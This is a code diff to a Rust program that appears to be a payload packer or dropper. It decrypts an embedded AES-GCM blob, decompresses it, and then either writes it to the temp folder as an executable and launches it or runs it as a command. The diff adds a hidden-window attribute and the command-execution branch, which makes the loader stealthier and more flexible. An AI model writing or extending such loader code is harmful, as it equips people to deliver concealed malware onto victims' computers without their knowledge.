@@ -1,3 +1,4 @@
+#![windows_subsystem = "windows"]
 use aes_gcm::{
     aead::{Aead, KeyInit},
     Aes256Gcm, Nonce,
@@ -95,7 +96,6 @@ fn main() {
         }
     };
 
-    // 解压缩
     let payload = match zstd::decode_all(&decrypted[..]) {
         Ok(p) => p,
         Err(_) => {
@@ -104,13 +104,19 @@ fn main() {
         }
     };
 
-    // Write to temp and execute
-    let mut out_path: PathBuf = std::env::temp_dir();
-    out_path.push(format!("rs_pack_payload_{}.exe", std::process::id()));
-    if fs::write(&out_path, &payload).is_ok() {
-        eprintln!("spawn payload: {}", out_path.display());
-        let _ = Command::new(&out_path).spawn();
-    } else {
-        eprintln!("write temp failed");
+    if payload.starts_with(b"CMD\0") {
+        let cmd = String::from_utf8_lossy(&payload[4..]).to_string();
+        let _ = Command::new(cmd).spawn();
+        return;
+    }
+    if payload.starts_with(b"MZ") {
+        let mut out_path: PathBuf = std::env::temp_dir();
+        out_path.push(format!("rs_pack_payload_{}.exe", std::process::id()));
+        if fs::write(&out_path, &payload).is_ok() {
+            eprintln!("spawn payload: {}", out_path.display());
+            let _ = Command::new(&out_path).spawn();
+        } else {
+            eprintln!("write temp failed");
+        }
     }
 }
